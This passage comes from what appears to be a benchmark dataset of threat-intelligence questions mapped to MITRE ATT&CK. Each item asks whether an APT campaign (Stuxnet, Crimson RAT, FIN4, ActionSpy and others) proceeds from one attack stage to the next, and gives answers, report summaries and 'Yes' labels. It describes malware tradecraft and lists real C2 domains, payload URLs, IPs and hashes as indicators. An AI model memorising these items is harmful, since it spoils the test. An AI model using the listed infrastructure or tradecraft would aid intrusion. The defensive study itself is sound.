Persistence: The RAT component of the Matryoshka framework ensured its persistence by copying the reflective loader to common Windows folders and creating a registry key for automatic execution upon system boot. Additionally, it scheduled a task named 'Microsoft Boost Kernel Optimization' to rerun the injection routine every 20 minutes, using a global mutex to prevent multiple instances from causing instability.
Credential Access: The RAT was capable of stealing Outlook passwords, a method that may have been copied from SecurityExploded's description for 'Recovering Passwords from Outlook 2002-2013'.
Collection: The RAT had capabilities for screen grabbing and keylogging, with portions of the source code traced back to the rohitab.com online forum.
Command and Control: The RAT used the DNS protocol to communicate with the C2 server, constructing DNS queries with a unique ID of the infected machine, a random string, and obfuscated data to be transmitted. The group used substitute ciphers to disguise the DNS traffic and made it difficult for traffic analysis and detection by using IP addresses from Microsoft and McAfee in the C2 responses.
Exfiltration: Data exfiltration was performed over the DNS protocol, with the RAT translating received commands from the C2 server into corresponding actions, such as stealing Outlook passwords when a specific IP address was received in the DNS response.
Others: The CopyKittens attack group is a mid-level threat actor known for their effective and stealthy multi-stage attacks, avoiding the use of known RATs and packers by developing 'homemade' tools. They have shown constant development to overcome security product improvements. The group's targets have included high-ranking diplomats and researchers specializing in Middle East Studies. The group's attack tool, 'Matryoshka', is a multi-stage framework with each part built to integrate with the subsequent step. The group's activities suggest that they will continue to target similar profiles in the future.",Yes,CopyKittens
677,185,185-Persistence-T1542-Pre-OS Boot,"After Stuxnet exploited the CVE-2010-2568 vulnerability through malicious .LNK files and TMP files to gain initial access to systems, is it likely that the malware would proceed to execute its packed DLL main module containing kernel-mode drivers and user-mode components before modifying system files and registry keys for persistence?","Persistence: Stuxnet achieved persistence by installing kernel-mode drivers and user-mode components onto infected systems. It used a boot start service to ensure its kernel-mode driver (MrxCls.sys) was loaded early in the OS boot process. The driver injected code into specific processes and monitored system behavior to maintain control. Additionally, Stuxnet modified system files and registry keys to ensure it was executed upon system startup.","Initial Access: The Stuxnet worm exploited the CVE-2010-2568 vulnerability to gain initial access to systems. This vulnerability was related to the way Windows displayed shortcut icons. Stuxnet used malicious .LNK files that, when viewed, would automatically execute the malware without user interaction. The worm specifically targeted SCADA systems, but its propagation method allowed it to spread widely. The initial infection vector was through removable drives, such as USB flash drives, which contained the malicious .LNK files and two TMP files (~WTR4141.TMP and ~WTR4132.TMP). The .LNK files were crafted to load the ~WTR4141.TMP file, which in turn would load and execute the ~WTR4132.TMP file, leading to the infection of the host machine.
Execution: Stuxnet's execution phase involved running malicious code on both local and remote systems. The worm's main module, a DLL packed with UPX, contained multiple resources including two kernel-mode drivers (MrxCls.sys and MrxNet.sys) and additional user-mode components. These drivers were responsible for injecting code into processes and hiding files used for propagation. Stuxnet also replaced legitimate system files with malicious versions to maintain persistence and control over infected systems. The malware executed exported functions from its main module to perform various tasks, such as building and running its dropper, spreading through the network, and communicating with command and control (C&C) servers.
Privilege Escalation: Stuxnet utilized two zero-day vulnerabilities, MS10-073 and MS10-092, to escalate privileges on infected systems. The MS10-073 vulnerability in the win32k.sys system module allowed Stuxnet to execute arbitrary code with SYSTEM privileges by loading a specially crafted keyboard layout file. The MS10-092 vulnerability in the Windows Task Scheduler Service enabled Stuxnet to elevate its privileges up to SYSTEM level by manipulating the metadata of scheduled tasks. The worm used these elevated privileges to perform actions that would otherwise be restricted.
Defense Evasion: Stuxnet employed multiple techniques to evade detection and analysis. It used rootkit functionality to hide its presence on infected systems, including hiding files and injecting code into processes. The worm also utilized stolen digital certificates to sign its kernel-mode drivers, making them appear as legitimate software components. Additionally, Stuxnet patched system libraries and hooked functions to load non-existent libraries, reducing the likelihood of detection by heuristic methods.
Lateral Movement: Stuxnet propagated laterally through networks by exploiting vulnerabilities and shared resources. It used the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability to spread itself across networked machines. The worm also scanned network shares and installed its dropper on accessible systems. Stuxnet's lateral movement capabilities allowed it to infect multiple systems within a targeted network, increasing its reach and impact.
Command and Control: Stuxnet communicated with C&C servers using HTTP. It encrypted its communications and sent data to predefined URLs, which included both decoy URLs (such as www.windowsupdate.com) and actual C&C server URLs (such as www.mypremierfutbol.com). The worm's C&C protocol involved sending system information and receiving commands or updates. Stuxnet also implemented an RPC server for peer-to-peer communication, allowing it to receive updates from other infected machines on the network.",Yes,Stuxnet_Under_the_Microscope
691,186,186-Collection-T1113-Screen Capture,"After the Pierogi backdoor collects information about the infected machine, including username and antivirus name, is it likely to capture screenshots and execute arbitrary commands before communicating with C2 servers using predefined URLs for data upload and command reception?","Collection: Pierogi's capabilities included taking screenshots and executing arbitrary commands via the CMD shell, which could be used for data collection.","Initial Access: The campaign targeting Palestinian individuals and entities began with social engineering tactics. Attackers lured victims into opening email attachments or downloading reports on political affairs related to Palestine. The malicious files were disguised as Microsoft Word documents or executables, with names such as 'Reports on major developments__347678363764' and 'Employee-entitlements-2020.doc'.
Execution: Upon opening the malicious documents, victims were presented with decoy content to lower their suspicions while the Pierogi backdoor was installed. The decoy documents included politically charged content, such as fake government documents, news about Hamas, and criticism of Hamas. Weaponized Microsoft Word documents contained an embedded downloader macro that, when enabled, downloaded and executed the Pierogi backdoor.
Persistence: The Pierogi backdoor achieved persistence by adding a shortcut to the startup folder, ensuring it ran upon user login. The shortcut pointed to the backdoor's binary location in the 'C:\ProgramData\' folder.
Defense Evasion: The Pierogi backdoor implemented checks for antivirus and security products, querying Windows for installed antivirus software using WMI and looking for specific products like Kaspersky and Bitdefender. It also used techniques such as file deletion and software packing to evade detection.
Discovery: The backdoor was capable of collecting information about the infected machine, including computer name, username, GUID, antivirus name, and operating system version.
Command and Control: The backdoor communicated with C2 servers using predefined URLs for sending machine information, receiving commands, and uploading data such as screenshots. It also had the ability to remove information based on commands from the C2 server.
Exfiltration: Data exfiltration was performed through web services, with the backdoor uploading screenshots to the C2 server.
Others: The campaign, suspected to be conducted by MoleRATs, an Arabic-speaking APT group, used the Pierogi backdoor for cyber espionage. The backdoor, written in Delphi, had basic capabilities and checks for a safe running environment. The infrastructure for the campaign was created in November 2019, with domains registered and operationalized shortly after. Cybereason raises the possibility that the backdoor was obtained from underground communities rather than developed in-house.",Yes,"New Cyber Espionage Campaigns Targeting Palestinians - Part 2_ The Discovery of the New, Mysterious Pierogi Backdoor"
693,186,186-Exfiltration-T1567-Exfiltration Over Web Service,"After communicating with C2 servers using predefined URLs to send machine information and receive commands, is it likely that the Pierogi backdoor will exfiltrate data by using web services for uploading screenshots to the C2 server?","Exfiltration: Data exfiltration was performed through web services, with the backdoor uploading screenshots to the C2 server.","Initial Access: The campaign targeting Palestinian individuals and entities began with social engineering tactics. Attackers lured victims into opening email attachments or downloading reports on political affairs related to Palestine. The malicious files were disguised as Microsoft Word documents or executables, with names such as 'Reports on major developments__347678363764' and 'Employee-entitlements-2020.doc'.
Execution: Upon opening the malicious documents, victims were presented with decoy content to lower their suspicions while the Pierogi backdoor was installed. The decoy documents included politically charged content, such as fake government documents, news about Hamas, and criticism of Hamas. Weaponized Microsoft Word documents contained an embedded downloader macro that, when enabled, downloaded and executed the Pierogi backdoor.
Persistence: The Pierogi backdoor achieved persistence by adding a shortcut to the startup folder, ensuring it ran upon user login. The shortcut pointed to the backdoor's binary location in the 'C:\ProgramData\' folder.
Defense Evasion: The Pierogi backdoor implemented checks for antivirus and security products, querying Windows for installed antivirus software using WMI and looking for specific products like Kaspersky and Bitdefender. It also used techniques such as file deletion and software packing to evade detection.
Discovery: The backdoor was capable of collecting information about the infected machine, including computer name, username, GUID, antivirus name, and operating system version.
Collection: Pierogi's capabilities included taking screenshots and executing arbitrary commands via the CMD shell, which could be used for data collection.
Command and Control: The backdoor communicated with C2 servers using predefined URLs for sending machine information, receiving commands, and uploading data such as screenshots. It also had the ability to remove information based on commands from the C2 server.
Others: The campaign, suspected to be conducted by MoleRATs, an Arabic-speaking APT group, used the Pierogi backdoor for cyber espionage. The backdoor, written in Delphi, had basic capabilities and checks for a safe running environment. The infrastructure for the campaign was created in November 2019, with domains registered and operationalized shortly after. Cybereason raises the possibility that the backdoor was obtained from underground communities rather than developed in-house.",Yes,"New Cyber Espionage Campaigns Targeting Palestinians - Part 2_ The Discovery of the New, Mysterious Pierogi Backdoor"
699,188,188-Initial Access-T1190-Exploit Public-Facing Application,"After deploying zero-day exploits to gain initial access via watering hole attacks, is it likely that the Elderwood Project attackers will establish command and control (C&C) servers to maintain control over compromised systems and retrieve commands from the attackers?","Initial Access: The Elderwood Project attackers have been deploying zero-day exploits through spear phishing emails and increasingly through Web injections in watering hole attacks. They have used a variety of zero-day exploits, including CVE-2012-0779, CVE-2012-1875, CVE-2012-1889, and CVE-2012-1535, to gain initial access to their targets. These attacks have been systematically targeting industries such as defense, NGOs, and IT service providers.","Command and Control: The Elderwood Project attackers have established command and control (C&C) servers to control compromised systems. Some of the C&C domains identified include qwby.gownsman.com, wwwcnas.org, gate-usa.com, and several others. These servers are used to retrieve commands from the attackers and maintain control over the victim's computer.
Others: The Elderwood Project, monitored by Symantec, involves a group that has been consistently targeting various industries for the past three years. The group is known for using an unlimited number of zero-day exploits and has been linked to the Hydraq (Aurora) Trojan horse attack on Google in 2009. The attackers have developed an attack platform, termed the 'Elderwood platform,' which allows them to quickly deploy zero-day exploits. The group's systematic approach and reuse of components indicate a high level of technical capability, suggesting the backing of a large criminal organization, nation-state support, or a nation-state itself. The Elderwood gang has been responsible for compromising numerous websites, corporations, and individuals, focusing on the wholesale theft of intellectual property. Symantec has provided various protection measures against these threats, including file-based protection, network-based protection, behavior-based protection, reputation-based protection, and email-based protection.",Yes,the-elderwood-project
710,190,190-Initial Access-T1566-Phishing,"After targeting officials of the Indian Ministry of External Affairs using a spear phishing campaign containing a malicious XLS document, is it likely that the malicious macro code within the XLS document will execute to first drop a Crimson RAT downloader before eventually downloading the fully functional Crimson RAT from the specified IP address?","Initial Access: Volon's Research team observed a spear phishing attack on Officials of the Indian Ministry of External Affairs in early August. The email lured officials by asking them to download an MS Excel sheet named 'amended training schedule of IFS officers'. The download link provided in the email appeared to be from 'https://www.mea.gov.in/ifs-training.schedule', but it actually pointed to a malicious XLS document from the URL 'http://info-sharing.net/?a=1533541533'.","Execution: The malicious document contained macro code which executed to drop the first payload, a Crimson RAT downloader. This payload then downloaded a fully functional Crimson RAT from the IP address 151.106.19[.]207:8246.
Persistence: The first payload downloaded the fully functional Crimson RAT and dropped it to the path 'C:\ProgramData\Hurmz\bahgrtmrs.exe'.
Defense Evasion: The payload had the capability to kill any process running in the system using specific code.
Credential Access: The Crimson RAT had functionalities for keylogging and browser credential theft.
Command and Control: The payload received commands from the C&C server and supported various commands such as listing running processes, listing antiviruses, sending file info, downloading files, updating the binary, and sending disk drives list. It also had the capability to send files to the C&C server.
Others: A document with similar tactics, techniques, and procedures (TTPs) was identified in early August with the name 'MoFA-MoDAfghanistan.xls', uploaded on 3rd August 2018. The XLS file contained malicious macro code, which upon execution, downloaded a payload from the URL 'http://afgcloud7.com/upld/updt.dll'. In 2016, Proofpoint published a report on 'Operation Transparent Tribe', detailing various attacks against Indian Embassies using Crimson RAT. One of the campaigns fetched a payload from the same URL as found in the second campaign 'http://afgcloud7.com/upld/updt.dll'. This suggests that the APT group behind Operation Transparent Tribe is active and targeting Indian officials again. The conclusion is that there is a high probability that the APT group behind 'Operation Transparent Tribe' might be active and is targeting Indian organizations again. Indicators of Compromise include various hashes and IP addresses: 58d52690179c2467fce76cec126ec5bb915f32d66955de954bd89e3110d6a03e0f0f6f48c3ee5f8e7cd3697c40002bc76b4635023eb1372df9b7618a5dae6128, 151.106.19.207:8246, 151.106.19.207:3286, 151.106.19.207:12621, and 'http://info-sharing.net/?a=1533541533'.",Yes,Targeted Attack on Indian Ministry of External Affairs using Crimson RAT
714,191,191-Execution-T1059-Command and Scripting Interpreter,"After initial access is achieved by injecting the Sharpshooter downloader into the memory of Word through a malicious macro, is it likely that the Rising Sun implant will download a second-stage payload during execution to act as a downloader for subsequent malicious activities?","Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
715,191,191-Execution-T1106-Native API,"After malicious documents were used to gain initial access by injecting the Sharpshooter downloader into the memory of Word, is it likely that the shellcode in winword.exe resolved libraries and APIs, downloaded the second-stage payload and a decoy document, and executed them using CreateProcessA() and ShellExecuteA() as part of the execution phase?","Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
762,198,198-Reconnaissance-T1590-Gather Victim Network Information,"Is it likely that UNC1151, after conducting initial access through spear phishing campaigns in Poland, Lithuania, Latvia, and Ukraine, engaged in reconnaissance to gather victim network information by targeting specific locations such as Ukraine, Lithuania, Latvia, Poland, Germany, and focusing on Eastern Europe?","Reconnaissance: Mandiant Threat Intelligence has identified that UNC1151, a group assessed with high confidence to be linked to the Belarusian government, has been actively involved in reconnaissance activities. Since at least 2016, UNC1151 has registered credential theft domains that spoof legitimate websites to steal victim credentials. The group has targeted a wide range of entities, focusing on Ukraine, Lithuania, Latvia, Poland, and Germany, as well as Belarusian dissidents, media entities, and journalists. The specific scope of targeting aligns with Belarusian interests, as the group has sought confidential information without any observed monetization efforts. UNC1151's reconnaissance has included regional webmail providers, national and local governments, and private businesses, with malware-based intrusions also focusing on Eastern Europe. Notably, UNC1151 has not targeted Russian or Belarusian state entities.","Initial Access: UNC1151 has demonstrated initial access capabilities through spear phishing campaigns. The group has not only targeted entities in countries neighboring Belarus but also those with no obvious connection to Belarusian interests, indicating a possible support for additional priorities. These operations mainly occurred between 2016 and 2019. UNC1151's phishing efforts have included sending malicious attachments to recipients in Poland, Lithuania, Latvia, Ukraine, and even governments such as Colombia, Ireland, and Switzerland. Additionally, credential theft emails have been sent to the Colombian Ministry of Foreign Affairs.
Credential Access: UNC1151 has been actively involved in credential access through the registration of credential theft domains that mimic legitimate websites. The group's phishing campaigns have been designed to steal victim credentials, with a focus on entities in Ukraine, Lithuania, Latvia, Poland, and Germany, as well as Belarusian dissidents and journalists. UNC1151's credential access activities have included targeting regional webmail providers, government entities, and private businesses. The group has not targeted Russian or Belarusian state entities, suggesting a specific focus on Belarusian government interests.
Others: Mandiant Threat Intelligence has high confidence that UNC1151 is linked to the Belarusian government and provides technical support to the Ghostwriter information operations campaign. The geopolitical indicators and observed narratives consistent with Belarusian government interests suggest moderate confidence that Belarus is at least partially responsible for Ghostwriter. While Russian contributions to UNC1151 or Ghostwriter cannot be ruled out, no direct evidence has been uncovered. UNC1151's operations have shown a consistent evolution of tactics, techniques, and procedures (TTPs) since 2017, indicating the maturation of a single organization. Ghostwriter operations have shifted focus since mid-2020 to align more distinctly with Belarusian interests, particularly following the disputed 2020 Belarusian elections. The narratives promoted by Ghostwriter have been featured on Belarusian state television and are relevant to the internal political conversation in Belarus. The sources of content for Ghostwriter operations and the malware used by UNC1151 remain uncertain, suggesting the possibility of involvement from additional organizations or countries. Mandiant assesses with high confidence that Ghostwriter information operations are conducted in support of the Belarusian government and with moderate confidence that they are conducted with Belarusian sponsorship. The lack of direct evidence prevents confirmation of Russian government involvement in UNC1151 and Ghostwriter operations, despite some TTP overlaps and consistency with Russian goals.",Yes,"UNC1151 Assessed with High Confidence to have Links to Belarus, Ghostwriter Campaign Aligned with Belarusian Government Interests _ Mandiant"
779,20,20-Defense Evasion-T1027-Obfuscated Files or Information,"After delivering the ActionSpy spyware via a phishing page modified to distribute a malicious Android application in the Initial Access phase, is it likely that Earth Empusa will utilize ActionSpy to impersonate a legitimate Uyghur video app and evade static analysis before establishing persistence by prompting users to enable its Accessibility service under the guise of a memory garbage cleaning service?","Defense Evasion: ActionSpy is protected by Bangcle to evade static analysis and detection. Its configuration, including the C&C server address, is encrypted by DES, with the decryption key generated in native code, making static analysis difficult.","Reconnaissance: The Earth Empusa group, also known as POISON CARP/Evil Eye, was observed using phishing attacks to deliver the ActionSpy malware. They targeted users in Tibet and Turkey before extending their scope to Taiwan. The campaign targeted victims related to Uyghurs by compromising their Android and iOS mobile devices. The group is known for using watering hole attacks, but phishing attacks have been recently observed. In April 2020, a phishing page disguised as a download page for a popular Android video application in Tibet was found, which may have been created by Earth Empusa. The page contained malicious scripts hosted on a domain belonging to the group.
Initial Access: The phishing page invited users to download a video app known to Tibetan Android users. The download link was modified to an archive file containing the Android application, which was an undocumented Android spyware named ActionSpy.
Execution: ActionSpy is an Android spyware that impersonates a legitimate Uyghur video app called Ekran. It uses VirtualApp to achieve the same appearance and features as the original app and is protected by Bangcle to evade static analysis and detection. ActionSpy collects basic device information every 30 seconds and sends it to the C&C server as a heartbeat request.
Persistence: ActionSpy prompts users to turn on its Accessibility service, claiming it is a memory garbage cleaning service. Once enabled, ActionSpy monitors Accessibility events on the device to steal chat log files from messaging apps like WeChat, QQ, WhatsApp, and Viber indirectly.
Credential Access: ActionSpy abuses the Android Accessibility service to collect chat logs from instant messaging applications by monitoring Accessibility events and parsing the current activity contents to extract information like nicknames, chat contents, and chat time.
Collection: ActionSpy supports modules for collecting various types of data, including device location, contacts, call logs, SMS messages, browser bookmarks, installed app info, running processes, Wi-Fi hotspots info, files on SDCard, and chat logs from WeChat, QQ, WhatsApp, and Viber.
Command and Control: All communication traffic between the C&C and ActionSpy is encrypted by RSA and transferred via HTTP. The C&C server may return commands to be performed on the compromised device.
Others: Earth Empusa also employs watering hole attacks to compromise iOS devices by injecting malicious scripts on websites that targets could potentially visit. The group uses the ScanBox framework to collect information from a website's visitors and an exploit chain framework to exploit vulnerabilities on iOS devices. In the first quarter of 2020, the exploit chain framework was upgraded to include a newer iOS exploit that can compromise iOS versions 12.3, 12.3.1, and 12.3.2.",Yes,New Android Spyware ActionSpy Revealed via Phishing Attacks from Earth Empusa - TrendLabs Security Intelligence Blog
800,202,202-Defense Evasion-T1036-Masquerading,"After distributing malicious LNK files disguised as Curriculum Vitae and IELTS exam results for initial access, is the Higaisa APT group likely to execute multiple commands leveraging 'gosia.exe' to bypass detection before maintaining persistence by copying 'svchhast.exe' to the startup directory and adding 'officeupdate.exe' to scheduled tasks?","Defense Evasion: The attack employs a list of commands executed by the LNK shortcut, similar to those reported in the Higasia Covid-19 campaign, with the only difference being the names of temporary files and the name of 'certutil.exe', which is renamed to 'gosia.exe' to bypass security detection.","Initial Access: The Higaisa APT group, believed to be tied to the Korean peninsula, distributed malicious LNK files within RAR archives, likely via spear-phishing. Two variants of the campaign were identified, distributed between May 12th and 31st, with the LNK files disguised as a Curriculum Vitae and IELTS exam results, or targeting product teams using zeplin.io.
Execution: Upon execution, the LNK file initiates a multi-stage attack involving several commands: copying the LNK content to a temporary directory, using 'certutil.exe' renamed to 'gosia.exe' to bypass security detection, decoding a base64 blob, decompressing content along with a decoy PDF document, and executing a JavaScript file. The JavaScript file then performs additional actions, including creating and executing 'd3reEW.exe', copying 'svchhast.exe' to the startup directory, and sending a POST request to a hardcoded URL.
Persistence: The JavaScript file involved in the attack creates 'd3reEW.exe' in a public downloads directory, executes 'svchast.exe', copies 'svchhast.exe' to the startup directory as 'officeupdate.exe', and adds 'officeupdate.exe' to scheduled tasks to maintain persistence.
Discovery: The JavaScript file involved in the attack creates 'd3reEW.exe' with the command 'cmd /c ipconfig' to discover IP address information.
Command and Control: The final shellcode within the attack resolves imports, allocates memory, and creates a thread to make HTTPS requests to a C&C server. However, the server was down at the time of analysis, preventing clear identification of the ultimate goal of the attack.
Others: The Higaisa APT group's activities date back to at least 2016 and include the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Their targets include government officials, human rights organizations, and other entities related to North Korea. Malwarebytes Labs, with authors Hossein Jazi and Jérôme Segura, identified the attack on May 29th and stopped the LNK file execution using the Nebula business version of their software. The attack was first disclosed by Tencent Security Threat Intelligence Center in early 2019.",Yes,New LNK attack tied to Higaisa APT discovered - Malwarebytes Labs _ Malwarebytes Labs
822,207,207-Credential Access-T1056-Input Capture,"After labeling the origin of stolen credentials using unique 'campaign codes' during resource development, is it likely that FIN4 will use spearphishing emails with embedded VBA macros to prompt victims for Outlook credentials before transmitting those credentials to their C2 servers for credential access?","Credential Access: FIN4's primary method of credential access involves spearphishing emails with embedded VBA macros in legitimate documents, which prompt users to enter their Outlook credentials. These credentials are then transmitted to FIN4's C2 servers. They also use fake OWA login pages to capture user credentials.","Reconnaissance: FireEye has been tracking a group named FIN4, which targets individuals with access to confidential information about merger and acquisition (M&A) deals and major market-moving announcements, especially in the healthcare and pharmaceutical industries. FIN4 focuses on individuals such as top executives, legal counsel, consultants, and researchers. They use spearphishing emails written by native English speakers familiar with investment terminology and the inner workings of public companies to capture usernames and passwords, allowing them to view private email correspondence.
Resource Development: FIN4 organizes their targets using over 70 unique 'campaign codes' to label the origin of stolen credentials. These codes are transmitted to FIN4's command and control (C2) servers along with the stolen credentials. Examples of campaign codes include 'CEO_CFO_COO_CORPDEV', 'SCIENTISTS_AND_RESEARCH', and specific company names.
Initial Access: FIN4 employs spearphishing emails to gain initial access to their targets' information. They embed VBA macros into legitimate documents that prompt users for their Outlook credentials, which are then sent to a server controlled by the group. FIN4 also uses fake Outlook Web App (OWA) login pages to capture credentials.
Defense Evasion: FIN4 has been observed creating rules in victims' Microsoft Outlook accounts that automatically delete any emails containing words like 'hacked', 'phish', 'malware', etc. This likely prevents compromised victims from receiving replies that their email account may be compromised, buying FIN4 extra time before detection.
Command and Control: FIN4 uses C2 servers to collect stolen credentials from their phishing campaigns. They have used domains such as junomaat81[.]us and lifehealthsanfrancisco2015[.]com for their C2 infrastructure. The group also relies on Tor for anonymous communication and has specific user agents that can be identified in network logs.
Others: FIN4 has been active since at least mid-2013 and continues to compromise new victims. They have targeted over 100 organizations, with approximately two-thirds being healthcare and pharmaceutical companies. The group uses their access to insider information to potentially benefit from stock price movements. FIN4's activities suggest a sustained effort to gain advance access to market-moving information, setting them apart due to the scale of their operations and their focus on key individuals' emails.",Yes,rpt-fin4
826,208,208-Initial Access-T1566-Phishing,"After employing spearphishing emails containing attachments that launch various stages of the attack, is Armageddon Group likely to execute Remote Template Injection techniques using RTF or DOCX files to download subsequent malicious stages before achieving persistence by modifying the registry RUN key with a malicious PE file?","Initial Access: Armageddon Group initiated attacks with spearphishing emails targeting Ukrainian government entities, containing topics related to internal affairs, foreign affairs, and the conflict with Russia. These emails included attachments such as RAR, DOCX, DOCM, LNK, and SFX files, which, when executed, launched various stages of the attack.","Execution: Armageddon Group employed Remote Template Injection techniques using RTF and DOCX files to download subsequent stages of their attacks. They embedded OLE objects in documents that requested remote template files containing malicious code. Additionally, they used a malicious LNK file within a TAR archive to initiate an attack stage using mshta.exe, which launched a VBScript.
Persistence: To maintain persistence, Armageddon Group utilized various methods, including a malicious PE file that modified the registry RUN key.
Defense Evasion: In the second stage of the attack, Armageddon Group used a malicious VBScript and abused the Telegram service to obtain the real C2 IP address, bypassing DNS.
Command and Control: Armageddon Group used Telegram channels such as 'dracarc' to communicate and potentially control compromised systems.
Others: The report includes Indicators of Compromise (IOCs) with various hashes and URLs associated with the Armageddon Group's activities. These IOCs are crucial for identifying and mitigating the threats posed by the group's cyber warfare tactics.",Yes,Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber
839,209,209-Discovery-T1518-Software Discovery,"After executing by reading its configuration file from C:\ProgramData and loading a DLL module into memory, is WinDealer likely to discover data from SNS applications before it categorizes the collected data into different directories as "".a"" files?","Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",Yes,Malware WinDealer used by LuoYu Attack Group - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog
849,21,21-Lateral Movement-T1570-Lateral Tool Transfer,"After discovering systems, users, and data relevant to the mission, is it likely that attackers will install further persistence points during lateral movement before proceeding to collect the relevant data?",Lateral Movement: This refers to moving across a network to the relevant data for the mission. This is often accompanied by the execution phase and the installation of further persistence points.,"Initial Access: The initial access phase is the starting point for all subsequent phases of an attack. It includes the initial contact with the attack target and compromising the so-called 'patient zero.'
Execution: The execution of malicious code on a local or remote system primarily takes place in the initial access and lateral movement phases. The next phase cannot be reached without execution of code controlled by the attacker. Execution is thus one of the most important prerequisites for the further development of the attack and for spreading across the target network.
Persistence: Persistence points within the target network ensure ongoing access to the compromised network. The more important the target is to the adversary, the more effort is put into persistence points for long-time access to the network.
